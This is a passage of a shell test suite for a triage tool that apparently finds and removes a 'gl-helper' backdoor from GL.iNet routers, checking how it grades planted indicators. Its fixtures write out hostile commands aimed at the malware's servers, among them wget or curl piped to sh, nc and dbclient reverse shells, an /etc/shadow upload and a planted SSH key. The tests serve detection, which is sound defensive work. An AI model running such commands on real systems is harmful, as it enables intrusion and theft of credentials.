run "$D" "$OWO" --check >"$D/check-off.txt"
expect "with GoodCloud off, remote access reads as not in use (issue 12)" 'grep -q "Remote access  *not in use, GoodCloud is off (stored settings: SSH on, web off)" "$D/check-off.txt"'
sed -i "s/option enable '0'/option enable '1'/" "$U/etc/config/gl-cloud"
expect "with GoodCloud on, the run ends with the advice to switch it off and the command" 'grep -q "Switch GoodCloud and AstroWarp off now" "$D/check.txt" && grep -q "GoodCloud is ON on this device" "$D/check.txt" && grep -q "uci set .gl-cloud.@cloud\[0\].enable=0." "$D/check.txt" && grep -q "gl-cloud disable" "$D/check.txt"'
expect "the account's address is not printed anywhere" '! grep -q "someone@example" "$D/check.txt"'
expect "compiled Lua elsewhere in the overlay: the loader by its names is IOC, other bytecode REVIEW" 'grep -q "IOC  *backdoor-file  */usr/lib/hidden-loader" "$D/check.txt" && grep -q "REVIEW  *lua-bytecode  */usr/lib/other.luac" "$D/check.txt" && ! grep -q "lua-bytecode.*plain.txt" "$D/check.txt"'
expect "a fetch from gl-inet.top in an autostart file is an indicator" 'grep -A1 "IOC  *persist-ref  */etc/init.d/S98top" "$D/check.txt" | grep -q "gl-inet.top"'
umount "$D/m"

echo "=== what the installer leaves (topic 73056, post 90)"
D=$(mkscen inst "$OWL"); U=$D/u
mkdir -p "$U/etc/gl_nas/.cache" "$U/userdata/.gl" "$U/tmp/gl_crontabs" "$U/etc/dropbear" "$U/root/.ssh" "$U/bin" "$U/overlay/.gl"
echo elf >"$U/etc/gl_nas/.cache/gl-helper"; echo x >"$U/etc/gl_nas/.cache/run.sh"; echo x >"$U/etc/gl_nas/.cache/.u"
echo mine >"$U/userdata/.gl/my-notes"
printf '0 4 * * * /usr/bin/own-job\n*/3 * * * * /bin/sh /etc/gl_nas/.cache/watch.sh\n' >"$U/tmp/gl_crontabs/root"
printf 'host 65.20.71.131\nport 5912\n' >"$U/etc/rtty_conf"
mkdir -p "$U/etc/gl_crontabs/crontabs.d"
printf '30 3 * * * /usr/bin/gl-own-task\n*/3 * * * * /bin/sh /etc/glinet/.cache/watch.sh\n' >"$U/etc/gl_crontabs/crontabs.d/tasks"
printf '0 5 * * * /usr/bin/other-task\n' >"$U/etc/gl_crontabs/crontabs.d/clean"
printf 'ssh-ed25519 AAAAOWNER me@home\nssh-ed25519 AAAAEVIL gl-agent\n' >"$U/etc/dropbear/authorized_keys"
mnt "$D" "$OWL"
rm "$D/m/bin/netstat"; printf '#!/bin/sh\n/bin/busybox netstat "$@" | grep -v x\n' >"$D/m/bin/netstat"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "the malware in a fallback directory is found" '[ $rc = 1 ] && grep -q "IOC  *marker  */etc/gl_nas/.cache/gl-helper" "$D/check.txt" && grep -q "IOC  *marker  */etc/gl_nas/.cache/run.sh" "$D/check.txt" && grep -q "IOC  *marker  */etc/gl_nas/.cache/.u" "$D/check.txt"'
expect "a fallback directory without its files is REVIEW only" 'grep -q "REVIEW  *hidden-dir  */userdata/.gl" "$D/check.txt" && ! grep -q "IOC.*userdata" "$D/check.txt"'
expect "running crontab, rtty server and gl-agent key are IOC" 'grep -q "IOC  *cron-ref  */tmp/gl_crontabs/root" "$D/check.txt" && grep -q "IOC  *rtty-server  */etc/rtty_conf" "$D/check.txt" && grep -q "IOC  *ssh-key  */etc/dropbear/authorized_keys" "$D/check.txt"'
expect "the netstat wrapper is named for what it is" 'grep -A1 "IOC  *applet-hijack  */bin/netstat" "$D/check.txt" | grep -q "hides lines"'
expect "the malware's line in a crontab file of the firmware is an IOC, a file without one is not" 'grep -q "IOC  *cron-ref  */etc/gl_crontabs/crontabs.d/tasks" "$D/check.txt" && ! grep -q "crontabs.d/clean" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix removes the fallback directory with the malware, leaves the other" '[ ! -e "$D/m/etc/gl_nas/.cache" ] && [ -f "$D/m/userdata/.gl/my-notes" ]'
expect "--fix strips only the malware's lines from crontab and authorized_keys" 'grep -q own-job "$D/m/tmp/gl_crontabs/root" && ! grep -q watch.sh "$D/m/tmp/gl_crontabs/root" && grep -q AAAAOWNER "$D/m/etc/dropbear/authorized_keys" && ! grep -q gl-agent "$D/m/etc/dropbear/authorized_keys"'
expect "--fix strips only the malware's line from the firmware's crontab file" 'grep -q gl-own-task "$D/m/etc/gl_crontabs/crontabs.d/tasks" && ! grep -q watch.sh "$D/m/etc/gl_crontabs/crontabs.d/tasks" && grep -q other-task "$D/m/etc/gl_crontabs/crontabs.d/clean"'
expect "--fix leaves rtty_conf alone, says so and ends incomplete (exit $rc, issue 22)" '[ $rc = 3 ] && grep -q "65.20.71.131" "$D/m/etc/rtty_conf" && grep -q "rtty_conf still names" "$D/fix.txt" && grep -q "Verdict: remediation INCOMPLETE" "$D/fix.txt" && ! grep -q "no gl-helper indicators left" "$D/fix.txt"'
umount "$D/m"

echo "=== rtty_conf alone, as GL.iNet's cleanup can leave it (issue 22)"
D=$(mkscen rtty "$OWL"); U=$D/u
mkdir -p "$U/etc"; printf 'host 65.20.71.131\nport 5912\n' >"$U/etc/rtty_conf"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "IOC, verdict INFECTED, and the result does not promise that --fix removes it (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *rtty-server  */etc/rtty_conf" "$D/check.txt" && grep -q "Verdict: INFECTED" "$D/check.txt" && grep -q "rtty-server: --fix does NOT change /etc/rtty_conf" "$D/check.txt" && ! grep -qF -- "--fix removes it" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes nothing, says why and exits 1, not 0 (exit $rc)" '[ $rc = 1 ] && grep -q "65.20.71.131" "$D/m/etc/rtty_conf" && grep -q "Nothing was changed" "$D/fix.txt" && grep -q "rtty_conf still names" "$D/fix.txt" && ! grep -q "No IOC found" "$D/fix.txt"'
umount "$D/m"

echo "=== a server of the malware: what a line does with it decides (issue 20)"
# An owner who blocks the servers names them as well. A block is INFO and stays, a name
# alone is REVIEW and stays, and only a line that fetches from a server is the malware.
D=$(mkscen srvblock "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults"
printf '#!/bin/sh\n# block 65.20.71.131 and 66.245.219.252 (CSA-2026-01)\niptables -I OUTPUT -d 65.20.71.131 -j DROP\niptables -I OUTPUT -d 66.245.219.252 -j REJECT\nip route add blackhole 65.20.71.131\nnft add rule inet fw4 output ip daddr 66.245.219.252 drop\n' >"$U/etc/hotplug.d/iface/99-block-csa"
printf '#!/bin/sh\necho "0.0.0.0 gl-inet.top" >>/etc/hosts\n' >"$U/etc/uci-defaults/99-null-host"
printf '#!/bin/sh\nping -c 1 gl-inet.top >/tmp/top.log\n# wget http://65.20.71.131:8000/ni.sh, as in the forum\n' >"$U/etc/init.d/zz-watch"
printf '# my own\n/root/start-vpn.sh\niptables -I OUTPUT -d 66.245.219.252 -j DROP\nexit 0\n' >"$U/etc/rc.local"
echo '0 4 * * * /root/backup.sh' >"$U/etc/crontabs/root"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "blocks are INFO server-block, a name alone REVIEW server-ref, no IOC (exit $rc)" '[ $rc = 0 ] && grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block-csa" "$D/check.txt" && grep -q "INFO  *server-block  */etc/uci-defaults/99-null-host" "$D/check.txt" && grep -q "REVIEW  *server-ref  */etc/init.d/zz-watch" "$D/check.txt" && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
expect "a block in rc.local is said on its PERSIST line" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "blocks a server of the malware (66.245.219.252)"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix leaves the block script, rc.local and the crontab as they are (exit $rc)" '[ $rc = 0 ] && [ -f "$D/m/etc/hotplug.d/iface/99-block-csa" ] && [ -f "$D/m/etc/init.d/zz-watch" ] && grep -q start-vpn "$D/m/etc/rc.local" && grep -q backup.sh "$D/m/etc/crontabs/root"'
umount "$D/m"

D=$(mkscen srvfetch "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/tmp/gl_crontabs" "$U/etc/gl_crontabs/crontabs.d"
printf 'wget -qO- http://65.20.71.131:8000/ni.sh | sh\nexit 0\n' >"$U/etc/rc.local"
echo '*/3 * * * * curl -s http://gl-inet.top:8899/x | sh' >"$U/etc/crontabs/root"
printf '#!/bin/sh\niptables -I OUTPUT -d 65.20.71.131 -j DROP; uclient-fetch -O /tmp/x http://66.245.219.252:8000/n5\n' >"$U/etc/hotplug.d/iface/98-both"
printf '#!/bin/sh\nH=65.20.71.131\nwget -O /tmp/x "http://$H:8000/ni.sh"\n' >"$U/etc/init.d/zz-indirect"
printf '0 4 * * * /usr/bin/own-job\n*/3 * * * * wget -qO- http://gl-inet.top:8899/w | sh\n' >"$U/tmp/gl_crontabs/root"
printf '30 3 * * * /usr/bin/gl-own-task\n*/5 * * * * rtty -h 65.20.71.131 -p 5912 -a\n' >"$U/etc/gl_crontabs/crontabs.d/tasks"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a fetch from a server in rc.local and the root crontab is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "fetches from a server of the malware (65.20.71.131)" && grep -A1 "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" | grep -q "gl-inet.top"'
expect "a line that blocks and fetches counts as fetching" 'grep -q "IOC  *persist-ref  */etc/hotplug.d/iface/98-both" "$D/check.txt"'
expect "fetch lines in the firmware's crontabs are IOC cron-ref" 'grep -q "IOC  *cron-ref  */tmp/gl_crontabs/root" "$D/check.txt" && grep -q "IOC  *cron-ref  */etc/gl_crontabs/crontabs.d/tasks" "$D/check.txt"'
expect "a server named in a variable that a fetch uses is IOC persist-ref (review of 2.55)" 'grep -A1 "IOC  *persist-ref  */etc/init.d/zz-indirect" "$D/check.txt" | grep -q "fetches from a server"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix resets rc.local and the crontab and removes the fetching file (exit $rc)" '[ $rc = 2 ] && ! grep -q 65.20.71.131 "$D/m/etc/rc.local" && [ ! -e "$D/m/etc/crontabs/root" ] && [ ! -e "$D/m/etc/hotplug.d/iface/98-both" ] && [ ! -e "$D/m/etc/init.d/zz-indirect" ]'
expect "--fix drops only the fetch lines from the firmware's crontabs" 'grep -q own-job "$D/m/tmp/gl_crontabs/root" && ! grep -q gl-inet.top "$D/m/tmp/gl_crontabs/root" && grep -q gl-own-task "$D/m/etc/gl_crontabs/crontabs.d/tasks" && ! grep -q rtty "$D/m/etc/gl_crontabs/crontabs.d/tasks"'
umount "$D/m"

echo "=== names in comments and in this script's name are no trace (review of 2.53)"
D=$(mkscen notes "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/config"
printf '#!/bin/sh\n# block the servers of the gl-helper malware\niptables -I OUTPUT -d 65.20.71.131 -j DROP   # its wget source\n' >"$U/etc/hotplug.d/iface/99-block-csa"
printf '0 4 * * * /root/backup.sh\n0 * * * * sh /root/gl-helper-triage.sh --no-report >/tmp/triage.log 2>&1\n7 * * * * nslookup gl-inet.top 127.0.0.1 | grep -q 0.0.0.0 || sh /root/reblock.sh\n' >"$U/etc/crontabs/root"
printf '/root/gl-helper-triage.sh\n/etc/config/my-vpn\n' >"$U/etc/sysupgrade.conf"
printf '127.0.0.1 localhost\n# older backdoor (CSA-2026-01): adguardns.com, adguardns.org\n0.0.0.0 adguardns.com\n0.0.0.0 adguardns.org # blocked\n' >"$U/etc/hosts"
printf "config rule\n\toption name 'Block-adguardns.com'\n\toption dest_ip '1.2.3.4'\n\toption target 'REJECT'\n" >"$U/etc/config/firewall"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
expect "a block with a note about gl-helper and wget is INFO server-block" 'grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block-csa" "$D/check.txt"'
expect "a cron job that runs this script, or a || sh after a lookup, is the owner's PERSIST" 'grep -q "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt"'
expect "the older backdoor's names in a comment or a rule's name are no trace" '! grep -q "backdoor-host" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/hosts" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && [ -f "$D/m/etc/hotplug.d/iface/99-block-csa" ] && grep -q gl-helper-triage "$D/m/etc/crontabs/root" && grep -q gl-helper-triage "$D/m/etc/sysupgrade.conf"'
umount "$D/m"

echo "=== an empty rc.local in the firmware: every line of yours is a change (busybox grep -f)"
D=$(mkscen emptyrc "$OWL"); U=$D/u
L0=$BASE/openwrt-rom-emptyrc; cp -a "$OWL" "$L0"; : >"$L0/etc/rc.local"
mkdir -p "$U/etc"; printf '/root/start-vpn.sh\nexit 0\n' >"$U/etc/rc.local"
mount -t overlay overlay -o "lowerdir=$L0,upperdir=$D/u,workdir=$D/w" "$D/m"
run "$D" "$L0" --check >"$D/check.txt"
expect "rc.local is PERSIST, not the firmware's own lines" 'grep -q "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" && ! grep -q "firmware-lines" "$D/check.txt"'
umount "$D/m"

echo "=== the firewall's start script (/etc/firewall.user)"
D=$(mkscen fwuser "$OWL"); U=$D/u
mkdir -p "$U/etc/firewall.d"
printf '# my rules\niptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nwget -qO- http://65.20.71.131:8000/ni.sh | sh\n' >"$U/etc/firewall.user"
printf '/etc/config/.gl/watch.sh &\n' >"$U/etc/firewall.d/90-x"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a fetch or the malware's script there is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/firewall.user" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/firewall.d/90-x" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix removes those lines and keeps the owner's rule (exit $rc)" '[ $rc = 2 ] && grep -q "192.168.8.50" "$D/m/etc/firewall.user" && ! grep -q 65.20.71.131 "$D/m/etc/firewall.user" && ! grep -q watch.sh "$D/m/etc/firewall.d/90-x"'
umount "$D/m"

echo "=== a path or server that a command only names, a probe, a block taken away (review of 2.53)"
# The owner's guards: they remove or look for the malware's files, check that a block
# holds, block the older backdoor's names as the summary advises. None of it is a trace.
D=$(mkscen guards "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/config"
printf '/root/start-vpn.sh\nrm -rf /etc/config/.gl/ /etc/glinet/.cache\niptables -I OUTPUT -d 65.20.71.131 -j DROP\niptables -I FORWARD -d openwrt-project.org -j DROP\nexit 0\n' >"$U/etc/rc.local"
printf '0 4 * * * /root/backup.sh\n*/10 * * * * pgrep -f gl-helper && logger -t csa "gl-helper is running"\n*/30 * * * * nc -z -w 3 65.20.71.131 8000 && logger -t csa "block failed"\n5 * * * * wget -q --spider http://gl-inet.top/ && logger -t csa up\n9 * * * * curl -s -o /dev/null http://66.245.219.252:8000/ || logger -t csa ok\n0 3 * * 0 sh /root/gl-helper-triage.sh --archive -o /mnt/usb/gl-helper --no-report\n' >"$U/etc/crontabs/root"
printf '#!/bin/sh\n[ -e /etc/config/.gl/gl-helper ] && logger -t csa ALERT\n/root/my-ddns.sh\n' >"$U/etc/hotplug.d/iface/99-watch"
printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() {\n  iptables -I OUTPUT -d 65.20.71.131 -j DROP\n  /usr/bin/agent -d &\n}\n' >"$U/etc/init.d/sysmon"
printf '#!/bin/sh\niptables -D OUTPUT -d 65.20.71.131 -j DROP\n' >"$U/etc/init.d/zz-unblock"
printf "config rule\n\toption name 'Block-backdoor'\n\toption src 'lan'\n\toption dest 'wan'\n\toption dest_ip 'adguardns.com'\n\toption target 'REJECT'\n" >"$U/etc/config/firewall"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
expect "rc.local and the crontab are PERSIST and say that they only name a path" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "names a path of the malware, but does not run it" && grep -A1 "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt" | grep -q "names a server of the malware (.*), but does not fetch from it; names a path"'
expect "a test for a file of the malware is REVIEW path-ref" 'grep -q "REVIEW  *path-ref  */etc/hotplug.d/iface/99-watch" "$D/check.txt"'
expect "a block does not hide what else a new file starts: INFO server-block and REVIEW new" 'grep -q "INFO  *server-block  */etc/init.d/sysmon" "$D/check.txt" && grep -q "REVIEW  *new  */etc/init.d/sysmon" "$D/check.txt"'
expect "taking a block away is no block: REVIEW server-ref" 'grep -q "REVIEW  *server-ref  */etc/init.d/zz-unblock" "$D/check.txt" && ! grep -q "server-block  */etc/init.d/zz-unblock" "$D/check.txt"'
expect "a firewall rule or command that blocks the older backdoor's names is INFO backdoor-block" 'grep -q "INFO  *backdoor-block  */etc/config/firewall" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/rc.local" "$D/check.txt" && ! grep -q "backdoor-host" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && grep -q "rm -rf /etc/config/.gl/" "$D/m/etc/rc.local" && grep -q "nc -z" "$D/m/etc/crontabs/root" && [ -f "$D/m/etc/hotplug.d/iface/99-watch" ] && [ -f "$D/m/etc/init.d/sysmon" ]'
umount "$D/m"

echo "=== what 2.52 found stays found: a continued line, more tools, a program from /tmp, a loop (review of 2.53)"
D=$(mkscen found "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults" "$U/etc/profile.d"
printf '#!/bin/sh\nwget -q -O /tmp/gb \\\n  http://65.20.71.131:8000/gb && chmod +x /tmp/gb && /tmp/gb\n' >"$U/etc/hotplug.d/iface/99-cont"
printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() { dbclient -y -f -N -R 2222:127.0.0.1:22 u@66.245.219.252; }\n' >"$U/etc/init.d/tun"
printf '#!/bin/sh\nwget-ssl -qO /tmp/n http://gl-inet.top:8899/n; sh /tmp/n\n' >"$U/etc/uci-defaults/99-ssl"
printf 'openssl s_client -quiet -connect 66.245.219.252:8899 | /bin/sh\n' >"$U/etc/profile.d/x.sh"
printf '#!/bin/sh /etc/rc.common\nstart() {\n  procd_open_instance\n  procd_set_param command /bin/sh /etc/config/.gl/run.sh\n  procd_close_instance\n}\n' >"$U/etc/init.d/zz-procd"
printf '(while :; do /etc/glinet/.cache/gl-helper; sleep 30; done) &\nexit 0\n' >"$U/etc/rc.local"
printf '*/5 * * * * /tmp/gb 65.20.71.131 8000\n' >"$U/etc/crontabs/root"
printf '# my rules\niptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nif [ -x /usr/bin/wget ]; then\n  wget -qO- http://65.20.71.131:8000/ni.sh | sh\nfi\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\n' >"$U/etc/firewall.user"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "each is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && (for f in /etc/hotplug.d/iface/99-cont /etc/init.d/tun /etc/uci-defaults/99-ssl /etc/profile.d/x.sh /etc/init.d/zz-procd /etc/rc.local /etc/crontabs/root /etc/firewall.user; do grep -q "IOC  *persist-ref  *$f" "$D/check.txt" || exit 1; done)'
expect "the loop in rc.local starts the malware, the program from /tmp fetches" 'grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "starts the malware (/etc/glinet/.cache/gl-helper)" && grep -A1 "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" | grep -q "fetches from a server"'
expect "the legend says that the firewall's start script is changed although it is listed for review" 'grep -q "Except the malware.s own lines in the firewall.s start script" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix: the malware's line in firewall.user becomes \":\", the script still reads as one (exit $rc)" '[ $rc = 2 ] && grep -q "^  : # line of the malware" "$D/m/etc/firewall.user" && grep -q "dport 2222" "$D/m/etc/firewall.user" && ! grep -q 65.20.71.131 "$D/m/etc/firewall.user" && env PATH="$TRIAGE_PATH" $TRIAGE_SH -n "$D/m/etc/firewall.user"'
umount "$D/m"

D=$(mkscen fwif "$OWL"); U=$D/u
mkdir -p "$U/etc"
printf '# my rules\nif wget -qO- http://65.20.71.131:8000/ni.sh | sh; then\n  iptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nfi\n' >"$U/etc/firewall.user"
mnt "$D" "$OWL"
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix leaves a firewall.user that would break without the line, and says so (exit $rc)" '[ $rc = 3 ] && grep -q "if wget" "$D/m/etc/firewall.user" && grep -q "left /etc/firewall.user: without the malware.s lines it would no longer run as a script" "$D/fix.txt"'
umount "$D/m"

echo "=== a check of a block, a count, delete before insert, an ipset; uploads, redirects, a commented \\ (third review of 2.53)"
# The owner's checks: wget -qO- into /dev/null, a count of the malware's files with $( ),
# rules deleted before they are added again, an ipset of the older backdoor's names.
D=$(mkscen checks "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/config"
printf '/root/start-vpn.sh\nPID=$(pidof gl-helper) && kill $PID\niptables -I OUTPUT -d 65.20.71.131 -j DROP\nexit 0\n' >"$U/etc/rc.local"
printf '0 4 * * * /root/backup.sh\n*/30 * * * * wget -qO- -T 5 http://65.20.71.131:8000/ >/dev/null 2>&1 && logger -t csa "block failed"\n*/20 * * * * uclient-fetch -q -O - http://gl-inet.top/ >/dev/null || logger -t csa ok\n' >"$U/etc/crontabs/root"
printf '#!/bin/sh\nn=$(ls /etc/config/.gl/ 2>/dev/null | wc -l)\n[ "$n" -gt 0 ] && logger -t csa ALERT\ncommand -v gl-helper >/dev/null && killall gl-helper\n' >"$U/etc/hotplug.d/iface/99-count"
printf '#!/bin/sh\niptables -D FORWARD -d openwrt-project.org -j DROP 2>/dev/null\niptables -I FORWARD -d openwrt-project.org -j DROP\niptables -D OUTPUT -d 65.20.71.131 -j DROP 2>/dev/null\niptables -I OUTPUT -d 65.20.71.131 -j DROP\n' >"$U/etc/hotplug.d/iface/99-block"
printf "config dnsmasq\n\tlist ipset '/adguardns.com/adguardns.org/openwrt-project.org/bdblock'\n" >"$U/etc/config/dhcp"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
expect "pidof in \$( ), ls in \$( ) and command -v only name a path" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "names a path of the malware, but does not run it" && grep -q "REVIEW  *path-ref  */etc/hotplug.d/iface/99-count" "$D/check.txt"'
expect "wget -qO- and uclient-fetch -O - into /dev/null are probes" 'grep -A1 "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt" | grep -q "names a server of the malware (.*), but does not fetch from it"'
expect "delete before insert is a block, for the malware and for the older backdoor" 'grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/hotplug.d/iface/99-block" "$D/check.txt"'
expect "an ipset of the older backdoor's names is INFO backdoor-block" 'grep -q "INFO  *backdoor-block  */etc/config/dhcp" "$D/check.txt" && ! grep -q "backdoor-host" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && grep -q "start-vpn" "$D/m/etc/rc.local" && grep -q "pidof" "$D/m/etc/rc.local" && grep -q "wget -qO-" "$D/m/etc/crontabs/root" && [ -f "$D/m/etc/hotplug.d/iface/99-count" ] && [ -f "$D/m/etc/hotplug.d/iface/99-block" ]'
umount "$D/m"

# A channel or download with its output in /dev/null, an upload, a commented \ that would
# hide the next line, and paths behind /usr/bin/nohup, timeout, sh -s < and cd.
D=$(mkscen hidden "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults" "$U/etc/profile.d" "$U/etc/udhcpc.user.d"
printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() { dbclient -y -f -N -R 2222:127.0.0.1:22 u@66.245.219.252 >/dev/null 2>&1; }\n' >"$U/etc/init.d/tun"
printf '#!/bin/sh\ncd /tmp && wget -q http://65.20.71.131:8000/gb >/dev/null 2>&1; chmod +x /tmp/gb; /tmp/gb &\n' >"$U/etc/hotplug.d/iface/99-gb"
printf '#!/bin/sh\nnc 65.20.71.131 8000 -e /bin/sh 2>/dev/null\n' >"$U/etc/hotplug.d/iface/99-nc"
printf '#!/bin/sh\ncurl -s -o /dev/null -d "id=$(cat /etc/machine-id)" http://65.20.71.131:8000/r\n' >"$U/etc/hotplug.d/iface/99-ping"
printf '#!/bin/sh\nwget -q -O /dev/null --post-file=/etc/shadow http://gl-inet.top:8899/u\n' >"$U/etc/uci-defaults/99-up"
printf '#!/bin/sh /etc/rc.common\nstart() {\n  logger -t net up  # wait for wan \\\n  wget -qO- http://65.20.71.131:8000/ni.sh | sh\n}\n' >"$U/etc/init.d/netcheck"
printf '#!/bin/sh /etc/rc.common\nstart() {\n  timeout -s KILL 60 /etc/config/.gl/gl-helper &\n}\n' >"$U/etc/init.d/zz-t"
printf 'sh -s < /etc/config/.gl/run.sh\n' >"$U/etc/profile.d/zz.sh"
printf '#!/bin/sh\ncd /etc/config/.gl/ && ./gb &\n' >"$U/etc/udhcpc.user.d/zz"
printf '*/5 * * * * rtty -h 65.20.71.131 -p 5912 -a >/dev/null 2>&1\n' >"$U/etc/crontabs/root"
printf '/root/start-vpn.sh  # \\\n/usr/bin/nohup /etc/glinet/.cache/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "each is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && (for f in /etc/init.d/tun /etc/hotplug.d/iface/99-gb /etc/hotplug.d/iface/99-nc /etc/hotplug.d/iface/99-ping /etc/uci-defaults/99-up /etc/init.d/netcheck /etc/init.d/zz-t /etc/profile.d/zz.sh /etc/udhcpc.user.d/zz /etc/crontabs/root /etc/rc.local; do grep -q "IOC  *persist-ref  *$f" "$D/check.txt" || exit 1; done)'
expect "the line behind a commented \\ is read on its own" 'grep -A1 "IOC  *persist-ref  */etc/init.d/netcheck" "$D/check.txt" | grep -q "fetches from a server" && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "starts the malware (/etc/glinet/.cache/gl-helper)"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix removes them (exit $rc)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/init.d/tun" ] && [ ! -e "$D/m/etc/init.d/netcheck" ] && [ ! -e "$D/m/etc/hotplug.d/iface/99-ping" ] && [ ! -e "$D/m/etc/uci-defaults/99-up" ] && ! grep -q gl-helper "$D/m/etc/rc.local"'
umount "$D/m"

echo "=== a deleted rc.local, a failed archive, a run from a pipe"
D=$(mkscen wo "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl"; echo payload >"$U/etc/config/.gl/gb"
mnt "$D" "$OWL"
rm "$D/m/etc/rc.local"
run "$D" "$OWL" --check >"$D/check.txt"
expect "a deleted rc.local is INFO deleted, not an odd file" 'grep -q "INFO  *deleted  */etc/rc.local" "$D/check.txt" && ! grep -q "odd-file" "$D/check.txt"'
run "$D" "$OWL" --fix -o /dev/null/x >"$D/fix.txt" 2>&1; rc=$?
expect "without an archive --fix changes nothing, still gives the verdict, exit 4" '[ $rc = 4 ] && grep -q "nothing was changed" "$D/fix.txt" && grep -q "Verdict: INFECTED" "$D/fix.txt" && [ -f "$D/m/etc/config/.gl/gb" ] && ! grep -q "Copy the evidence archive" "$D/fix.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix does not bring the deleted rc.local back (exit $rc)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/rc.local" ]'
env PATH="$TRIAGE_PATH" $TRIAGE_SH -s -- --root "$D/m" --upper "$D/u" --lower "$OWL" --check <"$T" >"$D/pipe.txt" 2>&1
expect "run from a pipe, the head does not offer sh sh --update" 'grep -q "runs from a pipe, not a file" "$D/pipe.txt" && ! grep -q "sh sh --update" "$D/pipe.txt"'
umount "$D/m"

